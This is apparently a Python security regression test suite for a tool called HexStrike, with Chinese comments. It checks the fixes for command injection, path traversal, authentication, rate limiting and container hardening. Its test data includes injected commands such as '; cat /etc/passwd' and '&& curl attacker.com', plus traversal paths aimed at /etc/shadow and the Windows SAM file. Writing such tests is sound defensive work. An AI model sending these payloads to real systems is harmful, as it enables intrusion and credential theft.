"""
安全修復驗證測試
測試所有 P0/P1 安全修復是否有效
"""
import unittest
import requests
import os
from pathlib import Path


class TestCommandInjectionFixes(unittest.TestCase):
    """測試命令注入修復"""
    
    def setUp(self):
        self.base_url = os.getenv('HEXSTRIKE_URL', 'http://localhost:8888')
        self.api_key = os.getenv('HEXSTRIKE_API_KEY', '')
        self.headers = {'X-API-Key': self.api_key} if self.api_key else {}
    
    def test_nmap_command_injection_blocked(self):
        """測試 Nmap 命令注入被阻擋"""
        payload = {
            'target': '8.8.8.8; cat /etc/passwd',  # 嘗試注入命令
            'scan_type': 'quick'
        }
        
        response = requests.post(
            f'{self.base_url}/api/tools/nmap',
            json=payload,
            headers=self.headers
        )
        
        # 預期：要麼返回錯誤，要麼命令被淨化
        # 不應該成功執行 cat /etc/passwd
        if response.status_code == 200:
            result = response.json()
            # 檢查輸出中不應包含 /etc/passwd 的內容
            output_str = str(result)
            self.assertNotIn('root:', output_str)
            self.assertNotIn('/bin/bash', output_str)
    
    def test_gobuster_command_injection_blocked(self):
        """測試 Gobuster 命令注入被阻擋"""
        payload = {
            'url': 'http://example.com && curl attacker.com',
            'wordlist': '/usr/share/wordlists/dirb/common.txt'
        }
        
        response = requests.post(
            f'{self.base_url}/api/tools/gobuster',
            json=payload,
            headers=self.headers
        )
        
        # 應該被阻擋或淨化
        if response.status_code == 200:
            result = response.json()
            # 不應該有 curl 的輸出
            self.assertNotIn('attacker.com', str(result))


class TestPathTraversalFixes(unittest.TestCase):
    """測試路徑穿越修復"""
    
    def setUp(self):
        self.base_url = os.getenv('HEXSTRIKE_URL', 'http://localhost:8888')
        self.api_key = os.getenv('HEXSTRIKE_API_KEY', '')
        self.headers = {'X-API-Key': self.api_key} if self.api_key else {}
    
    def test_path_traversal_blocked(self):
        """測試路徑穿越被阻擋"""
        # 嘗試訪問上層目錄
        malicious_paths = [
            '../../../etc/passwd',
            '../../../../etc/shadow',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd'  # URL 編碼
        ]
        
        for path in malicious_paths:
            response = requests.get(
                f'{self.base_url}/api/files',
                params={'path': path},
                headers=self.headers
            )
            
            # 應該返回錯誤或空結果，不應該包含敏感內容
            if response.status_code == 200:
                content = response.text
                self.assertNotIn('root:', content)
                self.assertNotIn('Administrator', content)


class TestAuthMiddleware(unittest.TestCase):
    """測試授權中間件"""
    
    def setUp(self):
        self.base_url = os.getenv('HEXSTRIKE_URL', 'http://localhost:8888')
    
    def test_missing_api_key_rejected(self):
        """測試缺少 API Key 被拒絕"""
        response = requests.post(
            f'{self.base_url}/api/tools/nmap',
            json={'target': '8.8.8.8'}
        )
        
        # 如果啟用了授權，應該返回 401
        if os.getenv('API_AUTH_ENABLED', 'true').lower() == 'true':
            self.assertEqual(response.status_code, 401)
    
    def test_invalid_api_key_rejected(self):
        """測試無效 API Key 被拒絕"""
        response = requests.post(
            f'{self.base_url}/api/tools/nmap',
            json={'target': '8.8.8.8'},
            headers={'X-API-Key': 'invalid-key-12345'}
        )
        
        # 應該返回 401
        if os.getenv('API_AUTH_ENABLED', 'true').lower() == 'true':
            self.assertEqual(response.status_code, 401)
    
    def test_rate_limiting(self):
        """測試 Rate Limiting"""
        api_key = os.getenv('HEXSTRIKE_API_KEY', '')
        if not api_key:
            self.skipTest("需要設定 HEXSTRIKE_API_KEY 環境變數")
        
        # 快速發送多個請求
        responses = []
        for i in range(110):  # 超過預設的 100 requests/min 限制
            response = requests.get(
                f'{self.base_url}/health',
                headers={'X-API-Key': api_key}
            )
            responses.append(response)
        
        # 應該有至少一個請求被限制（429）
        status_codes = [r.status_code for r in responses]
        self.assertIn(429, status_codes)


class TestSSLVerification(unittest.TestCase):
    """測試 SSL 驗證"""
    
    def test_ssl_verification_enabled_by_default(self):
        """測試 SSL 驗證預設啟用"""
        # 檢查環境變數
        disable_ssl = os.getenv('DISABLE_SSL_VERIFY', 'false')
        self.assertEqual(disable_ssl.lower(), 'false')
    
    def test_ssl_warning_when_disabled(self):
        """測試關閉 SSL 時會發出警告"""
        # 這個測試需要在代碼中添加警告機制
        pass


class TestDockerSecurity(unittest.TestCase):
    """測試 Docker 安全配置"""
    
    def test_backend_dockerfile_uses_fixed_version(self):
        """測試 Backend Dockerfile 使用固定版本"""
        dockerfile_path = Path(__file__).parent.parent.parent / 'src/backend/Dockerfile'
        if dockerfile_path.exists():
            content = dockerfile_path.read_text()
            self.assertIn('alpine:3.19', content)
            self.assertNotIn('alpine:latest', content)
    
    def test_frontend_dockerfile_has_healthcheck(self):
        """測試 Frontend Dockerfile 有 HEALTHCHECK"""
        dockerfile_path = Path(__file__).parent.parent.parent / 'src/frontend/Dockerfile'
        if dockerfile_path.exists():
            content = dockerfile_path.read_text()
            self.assertIn('HEALTHCHECK', content)


class TestKubernetesSecurity(unittest.TestCase):
    """測試 Kubernetes 安全配置"""
    
    def test_parser_amass_has_security_context(self):
        """測試 parser-amass.yaml 有安全上下文"""
        yaml_path = Path(__file__).parent.parent.parent / 'infrastructure/kubernetes/parser-amass.yaml'
        if yaml_path.exists():
            content = yaml_path.read_text()
            self.assertIn('securityContext', content)
            self.assertIn('allowPrivilegeEscalation: false', content)
            self.assertIn('readOnlyRootFilesystem: true', content)
            self.assertIn('runAsNonRoot: true', content)
            self.assertIn('drop:', content)
            self.assertIn('- ALL', content)
    
    def test_loadbalancer_has_ip_restriction(self):
        """測試 LoadBalancer 有 IP 限制"""
        yaml_path = Path(__file__).parent.parent.parent / 'infrastructure/kubernetes/argocd-loadbalancer.yaml'
        if yaml_path.exists():
            content = yaml_path.read_text()
            self.assertIn('loadBalancerSourceRanges', content)


class TestHardcodedCredentials(unittest.TestCase):
    """測試硬編碼憑證修復"""
    
    def test_go_config_validates_default_passwords(self):
        """測試 Go config 驗證預設密碼"""
        config_path = Path(__file__).parent.parent.parent / 'src/backend/config/config.go'
        if config_path.exists():
            content = config_path.read_text()
            # 應該有驗證邏輯
            self.assertIn('validate', content)
            self.assertIn('environment', content.lower())
            self.assertIn('production', content.lower())
    
    def test_grafana_uses_env_vars(self):
        """測試 Grafana 設置使用環境變數"""
        grafana_path = Path(__file__).parent.parent.parent / 'src/hexstrike-ai/monitoring/grafana_setup.py'
        if grafana_path.exists():
            content = grafana_path.read_text()
            self.assertIn('os.getenv', content)
            self.assertIn('GRAFANA_ANALYST_PASSWORD', content)
            self.assertIn('GRAFANA_VIEWER_PASSWORD', content)


if __name__ == '__main__':
    print("🧪 執行安全修復驗證測試...")
    print("=" * 60)
    
    # 設定測試環境
    if not os.getenv('HEXSTRIKE_URL'):
        print("⚠️  未設定 HEXSTRIKE_URL，使用預設值 http://localhost:8888")
    
    # 執行測試
    unittest.main(verbosity=2)


